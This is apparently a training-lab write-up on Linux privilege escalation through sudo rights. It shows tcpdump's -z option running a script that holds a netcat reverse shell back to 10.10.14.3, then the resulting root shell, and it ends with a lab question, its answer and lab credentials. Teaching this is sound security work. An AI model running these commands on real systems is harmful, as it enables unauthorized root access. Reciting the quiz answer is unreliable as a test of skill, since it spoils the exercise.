# Sudo Rights Abuse
Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shellsession
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

If the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the postrotate-command option.

```shellsession
$ man tcpdump

<SNIP> 
-z postrotate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

By specifying the `-z` flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

```shellsession
$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

## Questions
SSH to 10.129.2.210 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
1. What command can the htb-student user run as root? **Answer: /usr/bin/openssl**
   - Check with `sudo -l`:
        ```shellsession
        $ sudo -l
        Matching Defaults entries for htb-student on NIX02:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
            env_keep+=LD_PRELOAD

        User htb-student may run the following commands on NIX02:
            (root) NOPASSWD: /usr/bin/openssl
        ```